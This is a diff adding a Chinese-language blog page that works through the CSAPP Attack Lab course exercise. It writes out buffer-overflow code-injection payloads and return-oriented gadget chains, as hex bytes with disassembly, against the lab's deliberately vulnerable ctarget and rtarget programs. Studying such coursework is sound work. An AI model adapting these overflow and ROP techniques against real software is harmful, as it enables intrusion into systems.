@@ -1,0 +1,455 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSAPP Attack Lab | Lordaeron_ESZ's blog</title><meta name="keywords" content="经验,计算机基础,汇编语言"><meta name="author" content="Chaoqun Zheng"><meta name="copyright" content="Chaoqun Zheng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 缓冲区溢出漏洞 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Attack Lab">
+<meta property="og:url" content="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/index.html">
+<meta property="og:site_name" content="Lordaeron_ESZ&#39;s blog">
+<meta property="og:description" content="个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 缓冲区溢出漏洞 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/csapp.jpg">
+<meta property="article:published_time" content="2024-09-25T03:45:11.000Z">
+<meta property="article:modified_time" content="2024-09-25T09:32:48.895Z">
+<meta property="article:author" content="Chaoqun Zheng">
+<meta property="article:tag" content="经验">
+<meta property="article:tag" content="计算机基础">
+<meta property="article:tag" content="汇编语言">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/csapp.jpg"><link rel="shortcut icon" href="/img/bird_32x32.png"><link rel="canonical" href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="ClHeIfdxbuDap8IIc_tsXB2ONrEjpWXvdqFNV7FPsa4"/><meta name="baidu-site-verification" content="code-64LOUYpRAB"/><meta name="bing_site_verification" content="5E3A4478903716830DB93F75FFB66BEC"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?83d8d2d69250d7480924aa794b7af03a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CSAPP Attack Lab',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-25 17:32:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lordaeron_ESZ's blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/huaji0.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Lordaeron_ESZ's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">CSAPP Attack Lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-25T03:45:11.000Z" title="发表于 2024-09-25 11:45:11">2024-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-25T09:32:48.895Z" title="更新于 2024-09-25 17:32:48">2024-09-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CSAPP Attack Lab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><p>个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 <strong>缓冲区溢出漏洞</strong> 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。</p>
+<span id="more"></span>
+
+<p>这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 <code>./ctarget -q</code> ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？</p>
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png"></p>
+<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>在倒腾好环境之后，终于可以开始着手完成实验了。</p>
+<p>phase_1 要求我们在调用 <code>getbuf</code> 读取标准输入后，不返回到 <code>test</code> 函数接着执行 <code>printf</code>，而是转而执行 <code>touch1</code>.</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> val<span class="token punctuation">;</span>
+    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 <code>getbuf</code> 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop</code></pre>
+
+<p>观察上述函数 <code>getbuf</code> 的汇编代码，从第一条指令 <code>sub  $0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p>
+<blockquote>
+<p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p>
+</blockquote>
+<p>最终的攻击数据如下所示：</p>
+<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+c0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre>
+
+<p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre>
+
+<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p>
+<p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>一种有效的注入代码完成的操作如下：</p>
+<ol>
+<li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li>
+<li>跳转到程序 <code>touch2</code> 处。</li>
+</ol>
+<p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p>
+<p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi
+   7:   00 
+   8:   68 ec 17 40 00          pushq  $0x4017ec
+   d:   c3                      retq</code></pre>
+
+<p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p>
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png"></p>
+<p>最终的攻击数据如下所示：</p>
+<pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 00
+68 ec 17 40 00 c3 00 00
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+78 dc 61 55 00 00 00 00</code></pre>
+
+<p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p>
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png"></p>
+<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)
+&#123;
+    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;
+    if (hexmatch(cookie, sval)) &#123;
+    	printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+    	validate(3);
+    &#125; else &#123;
+    	printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+    	fail(3);
+    &#125;
+    exit(0);
+&#125;
+
+&#x2F;* Compare string to hex represention of unsigned value *&#x2F;
+int hexmatch(unsigned val, char *sval)
+&#123;
+    char cbuf[110];
+    &#x2F;* Make position of check string unpredictable *&#x2F;
+    char *s &#x3D; cbuf + random() % 100;
+    sprintf(s, &quot;%.8x&quot;, val);
+    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;
+&#125;</code></pre>
+
+<p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p>
+<p>注入的代码如下：</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq </code></pre>
+
+<p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p>
+<p>这里我遇到了一点问题，这是错误的攻击数据：</p>
+<pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68
+fa 18 40 00 c3 00 00 00 
+35 39 62 39 39 37 66 61
+00 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+78 dc 61 55 00 00 00 00</code></pre>
+
+<p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p>
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png"></p>
+<p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p>
+<pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+00</code></pre>
+
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png"></p>
+<h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p>
+<p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p>
+<p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png"></p>
+<p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p>
+<p>一种正确的 gadget 组合如下：</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget1
+00000000004019ab &lt;addval_219 + 4&gt;:
+58  pop %rax
+90  nop
+c3  ret
+
+# gadget2
+00000000004019c5 &lt;setval_426 + 2&gt;:
+48 89 c7  movq %rax,%rdi
+90        nop
+c3		  ret</code></pre>
+
+<p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p>
+<blockquote>
+<p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p>
+</blockquote>
+<p>最终的攻击数据如下：</p>
+<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00</code></pre>
+
+<h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p>
+<p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p>
+<p>以下是一种正确的 gadget 实现：</p>
+<pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget1
+00000000004019ab &lt;addval_219 + 4&gt;:
+58  pop %rax
+90  nop
+c3  ret
+
+# gadget2
+00000000004019dd &lt;getval_481 + 2&gt;:
+89 c2   movl %eax,%edx
+90		nop
+c3		ret
+
+# gadget3
+0000000000401a69 &lt;getval_481 + 1&gt;:
+89 d1   movl %edx,%ecx
+08 db	orb  %bl,%bl
+c3		ret
+
+# gadget4
+0000000000401a13 &lt;addval_436 + 2&gt;:
+89 ce   movl %ecx,%esi
+90		nop
+90		nop
+c3		ret
+
+# gadget5
+0000000000401aad &lt;setval_350 + 2&gt;:
+48 89 e0  movq %rsp,%rax
+90		  nop
+c3		  ret
+
+# gadget6
+00000000004019a2 &lt;addval_273 + 2&gt;:
+48 89 c7  movq %rax,%rdi
+c3		  ret
+
+# gadget7
+00000000004019d6 &lt;add_xy&gt;:
+48 8d 04 37  lea  (%rdi,%rsi,1),%rax
+c3			 ret
+
+# gadget8
+00000000004019a2 &lt;addval_273 + 2&gt;:
+48 89 c7  movq %rax,%rdi
+c3		  ret</code></pre>
+
+<p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p>
+<pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+3f 3f 3f 3f 3f 3f 3f 3f
+ab 19 40 00 00 00 00 00
+20 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+69 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+ad 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+00</code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Chaoqun Zheng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/">http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lordaeronesz.github.io" target="_blank">Lordaeron_ESZ's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%8F%E9%AA%8C/">经验</a><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a><a class="post-meta__tags" href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">汇编语言</a></div><div class="post_share"><div class="social-share" data-image="/2024/09/25/CSAPP-Attack-Lab/csapp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.png" target="_blank"><img class="post-qr-code-img" src="/img/wechatpay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/09/17/CSAPP-Bomb-Lab/"><img class="next-cover" src="/2024/09/17/CSAPP-Bomb-Lab/csapp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CSAPP Bomb Lab</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/17/CSAPP-Bomb-Lab/" title="CSAPP Bomb Lab"><img class="cover" src="/2024/09/17/CSAPP-Bomb-Lab/csapp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-17</div><div class="title">CSAPP Bomb Lab</div></div></a></div><div><a href="/2024/08/31/CSAPP-Data-Lab/" title="CSAPP Data Lab"><img class="cover" src="/2024/08/31/CSAPP-Data-Lab/csapp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-31</div><div class="title">CSAPP Data Lab</div></div></a></div><div><a href="/2023/03/11/计算机基础面试题总结/" title="计算机基础面试题总结"><img class="cover" src="/2023/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/cs.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 